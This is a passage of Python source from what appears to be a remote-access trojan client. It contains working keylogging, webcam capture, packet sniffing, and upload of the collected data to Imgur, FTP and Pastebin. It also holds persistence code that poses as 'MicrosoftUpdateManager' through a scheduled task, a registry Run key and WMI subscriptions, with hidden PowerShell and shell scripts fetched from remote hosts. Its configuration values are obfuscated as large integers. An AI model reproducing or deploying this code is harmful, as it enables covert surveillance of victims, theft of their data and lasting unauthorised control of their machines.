            self._threads['keylogger_helper'] = threading.Thread(target=self._keylogger_helper, name='keylogger_helper')
            self._threads['keylogger_helper'].start()
            while True:
                if self._exit:
                    break
                hm = HookManager()
                hm.KeyDown = self._keylogger_event
                hm.HookKeyboard()
                if os.name is 'nt':
                    PumpMessages()
                else:
                    time.sleep(0.1)
                    
    # ------------------- webcam -------------------------

    def _webcam_image(self):
        dev = VideoCapture(0)
        tmp = tempfile.mktemp(suffix='.png')
        r,f = dev.read()
        waitKey(1)
        imwrite(tmp, f)
        dev.release()
        result = self._upload_imgur(tmp)
        return result

    def _webcam_video(self):
        fpath   = tempfile.mktemp(suffix='.avi')
        fourcc  = VideoWriter_fourcc(*'DIVX') if sys.platform is 'win32' else VideoWriter_fourcc(*'XVID')
        output  = VideoWriter(fpath, fourcc, 20.0, (640,480))
        dev     = VideoCapture(0)
        end     = time.time() + 5.0
        while True:
            ret, frame = dev.read()
            output.write(frame)
            if waitKey(0) and time.time() > end: break
        dev.release()
        result = self._upload_ftp(fpath)
        return result

    # ------------------- packetsniff -------------------------

    def _packetsniff_udp_header(self, data):
        try:
            udp_hdr = struct.unpack('!4H', data[:8])
            src     = udp_hdr[0]
            dst     = udp_hdr[1]
            length  = udp_hdr[2]
            chksum  = udp_hdr[3]
            data    = data[8:]
            self.packetsniff.options['capture'].append('|================== UDP HEADER ==================|')
            self.packetsniff.options['capture'].append('|================================================|')
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Source', src))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Length', length))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniff.options['capture'].append('|================================================|')
            return data
        except Exception as e:
            self.packetsniff.options['capture'].append("Error in {} header: '{}'".format('UDP', str(e)))

    def _packetsniff_tcp_header(self, recv_data):
        try:
            tcp_hdr  = struct.unpack('!2H2I4H', recv_data[:20])
            src_port = tcp_hdr[0]
            dst_port = tcp_hdr[1]
            seq_num  = tcp_hdr[2]
            ack_num  = tcp_hdr[3]
            data_ofs = tcp_hdr[4] >> 12
            reserved = (tcp_hdr[4] >> 6) & 0x03ff
            flags    = tcp_hdr[4] & 0x003f
            flagdata = {
                'URG' : bool(flags & 0x0020),
                'ACK' : bool(flags & 0x0010),
                'PSH' : bool(flags & 0x0008),
                'RST' : bool(flags & 0x0004),
                'SYN' : bool(flags & 0x0002),
                'FIN' : bool(flags & 0x0001)
            }
            win = tcp_hdr[5]
            chk_sum = tcp_hdr[6]
            urg_pnt = tcp_hdr[7]
            recv_data = recv_data[20:]

            self.packetsniff.options['capture'].append('|================== TCP HEADER ==================|')
            self.packetsniff.options['capture'].append('|================================================|')
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Window', win))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
            self.packetsniff.options['capture'].append('|================================================|')
            return recv_data
        except Exception as e:
            self.packetsniff.options['capture'].append("Error in {} header: '{}'".format('TCP', str(e)))

    def _packetsniff_ip_header(self, data):
        try:
            ip_hdr  = struct.unpack('!6H4s4s', data[:20]) 
            ver     = ip_hdr[0] >> 12
            ihl     = (ip_hdr[0] >> 8) & 0x0f
            tos     = ip_hdr[0] & 0x00ff 
            tot_len = ip_hdr[1]
            ip_id   = ip_hdr[2]
            flags   = ip_hdr[3] >> 13
            fragofs = ip_hdr[3] & 0x1fff
            ttl     = ip_hdr[4] >> 8
            ipproto = ip_hdr[4] & 0x00ff
            chksum  = ip_hdr[5]
            src     = socket.inet_ntoa(ip_hdr[6])
            dest    = socket.inet_ntoa(ip_hdr[7])
            data    = data[20:]

            self.packetsniff.options['capture'].append('|================== IP HEADER ===================|')
            self.packetsniff.options['capture'].append('|================================================|')
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('VER', ver))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t |'.format('Source IP', src))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
            self.packetsniff.options['capture'].append('|================================================|')
            return data, ipproto
        except Exception as e:
            self.packetsniff.options['capture'].append("Error in {} header: '{}'".format('IP', str(e)))


    def _packetsniff_eth_header(self, data):
        try:
            ip_bool = False
            eth_hdr = struct.unpack('!6s6sH', data[:14])
            dst_mac = binascii.hexlify(eth_hdr[0])
            src_mac = binascii.hexlify(eth_hdr[1])
            proto   = eth_hdr[2] >> 8

            self.packetsniff.options['capture'].append('|================================================|')
            self.packetsniff.options['capture'].append('|================== ETH HEADER ==================|')
            self.packetsniff.options['capture'].append('|================================================|')
            self.packetsniff.options['capture'].append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
            self.packetsniff.options['capture'].append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
            self.packetsniff.options['capture'].append('|================================================|')

            if proto == 8:
                ip_bool = True
            data = data[14:]
            return data, ip_bool
        except Exception as e:
            self.packetsniff.options['capture'].append("Error in {} header: '{}'".format('ETH', str(e)))

    def _packetsniff_manager(self, seconds):
        if os.name is 'nt':
            return
        limit = time.time() + seconds
        sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        while time.time() < limit:
            try:
                recv_data = sniffer_socket.recv(2048)
                recv_data, ip_bool = self._packetsniff_eth_header(recv_data)
                if ip_bool:
                    recv_data, ip_proto = self._packetsniff_ip_header(recv_data)
                    if ip_proto == 6:
                        recv_data = self._packetsniff_tcp_header(recv_data)
                    elif ip_proto == 17:
                        recv_data = self._packetsniff_udp_header(recv_data)
            except: break
        try:
            sniffer_socket.close()
        except: pass
        result = '\n'.join(self.packetsniff.options['capture'])
        if self.upload.status.is_set():
            result = self._upload_pastebin(result)
        self._result['packetsniff'][time.ctime()] = result
        self.packetsniff.options['capture'] = []
        return result

    # ------------------- persistence -------------------------

    def _persistence_add_scheduled_task(self):
        if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
            tmpdir      = tempfile.gettempdir()
            task_name   = 'MicrosoftUpdateManager'
            task_run    = os.path.join(tmpdir, self._long_to_bytes(long(self.__f__)))
            copy        = 'copy' if os.name is 'nt' else 'cp'
            if not os.path.isfile(task_run):
                backup  = os.popen(' '.join(copy, self._long_to_bytes(long(self.__f__)), task_run)).read()
            try:
                if subprocess.call('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                    return True
            except Exception as e:
                if '__v__' in vars(self) and self.__v__:
                    print 'Add scheduled task error: {}'.format(str(e))
        return False

    def _persistence_remove_scheduled_task(self):
        if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
            try:
                task_name = name or os.path.splitext(os.path.basename(self._long_to_bytes(long(self.__f__))))[0]
                if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(task_name), shell=True) == 0:
                    return True
            except: pass
            return False

    def _persistence_add_startup_file(self):
        if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
            try:
                appdata = os.path.expandvars("%AppData%")
                startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                if os.path.exists(startup_dir):
                    random_name = str().join([choice([chr(i).lower() for i in range(123) if chr(i).isalnum()]) for _ in range(choice(range(6,12)))])
                    persistence_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % self._long_to_bytes(long(self.__f__))
                    with file(persistence_file, 'w') as fp:
                        fp.write(content)
                    return True
            except Exception as e:
                if '__v__' in vars(self) and self.__v__:
                    print 'Adding startup file error: {}'.format(str(e))
        return False

    def _persistence_remove_startup_file(self):
        if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
            try:
                appdata     = os.path.expandvars("%AppData%")
                startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                if os.path.exists(startup_dir):
                    for f in os.listdir(startup_dir):
                        filepath = os.path.join(startup_dir, f)
                        if filepath.endswith('.eu.url'):
                            try:
                                os.remove(filepath)
                                return True
                            except: pass
            except: pass
            return False

    def _persistence_add_registry_key(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
            reg_key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
            value   = self._long_to_bytes(long(self.__f__))
            try:
                SetValueEx(reg_key, name, 0, REG_SZ, value)
                CloseKey(reg_key)
                return True
            except Exception as e:
                if '__v__' in vars(self) and self.__v__:
                    print 'Remove registry key error: {}'.format(str(e))
        return False

    def _persistence_remove_registry_key(self, name='MicrosoftUpdateManager'):
        try:
            key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
            DeleteValue(key, name)
            CloseKey(key)
            return True
        except: pass
        return False

    def _persistence_add_wmi_object(self, command=None, name='MicrosoftUpdaterManager'):
        try:
            if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
                filename = self._long_to_bytes(long(self.__f__))
                if not os.path.exists(filename):
                    return 'Error: file not found: {}'.format(filename)
                cmd_line = 'start /b /min {}'.format(filename)
            elif command:
                cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
            startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
            powershell = requests.get(self._long_to_bytes(self.__s__)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
            self._powershell(powershell)
            code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
            result = self._powershell(code)
            if name in result:
                return True
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print 'WMI persistence error: {}'.format(str(e))        
        return False

    def _persistence_remove_wmi_object(self, name='MicrosoftUpdaterManager'):
        if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
            try:
                code =''' 
                Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
                Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject'''.replace('[NAME]', name)
                result = self._powershell(code)
                if not result:
                    return True
            except: pass
        return False

    def _persistence_add_hidden_file(self):
        if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
            try:
                name = os.path.basename(self._long_to_bytes(long(self.__f__)))
                if os.name is 'nt':
                    hide = subprocess.call('attrib +h {}'.format(name), shell=True) == 0
                else:
                    hide = subprocess.call('mv {} {}'.format(name, '.' + name), shell=True) == 0
                    if hide:
                        self.__f__ = self._bytes_to_long(os.path.join(os.path.dirname('.' + name), '.' + name))
                if hide:
                    return True
            except Exception as e:
                if '__v__' in vars(self) and self.__v__:
                    print 'Adding hidden file error: {}'.format(str(e))
        return False

    def _persistence_remove_hidden_file(self, *args, **kwargs):
        if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
            try:
                return subprocess.call('attrib -h {}'.format(self._long_to_bytes(long(self.__f__))), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0
            except Exception as e:
                if '__v__' in vars(self) and self.__v__:
                    print 'Error unhiding file: {}'.format(str(e))
        return False

    def _persistence_add_launch_agent(self, name='com.apple.update.manager'):
        if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
            try:
                code    = requests.get(self._long_to_bytes(self.__g__)).content
                label   = name
                fpath   = tempfile.mktemp(suffix='.sh')
                bash    = code.replace('__LABEL__', label).replace('__FILE__', self._long_to_bytes(long(self.__f__)))
                fileobj = file(fpath, 'w')
                fileobj.write(bash)
                fileobj.close()
                self._result['persistence']['launch agent'] = '~/Library/LaunchAgents/{}.plist'.format(label)
                bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(x), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                return True
            except Exception as e2:
                if '__v__' in vars(self) and self.__v__:
                    print 'Error: {}'.format(str(e2))
        return False

    def _persistence_remove_launch_agent(self, name=None):
        if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
            try:
                name = name or os.path.splitext(os.path.basename(self._long_to_bytes(long(self.__f__))))[0]
                os.remove('~/Library/LaunchAgents/{}.plist'.format(name))
                return True
            except: pass
        return False

    def _persistence(self):
        result = {}
        for method in self.persistence.options:
            if method not in self._result['persistence']:
                try:
                    function = '_persistence_add_{}_{}'.format(*method.split())
                    result[method] = getattr(self, function)()
                except Exception as e:
                    result[method] = str(e)
        self._result['persistence'].update(result)
        if self.standby.status.is_set():
            self._logger.log(40, result, extra={'submodule': 'persistence'})
        return result






# new modules go here








# -----------------   main   --------------------------


def main(*args, **kwargs):
    client = Client(**kwargs)
    return client


if __name__ == '__main__':
    main({
            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
            "__e__": "423224063517525567299427660991207813087967857812230603629111",
            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
            "__v__": "1",
	    "__w__": "12095051301478169748777225282050429328988589300942044190524180336593048582637364",
            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
    })

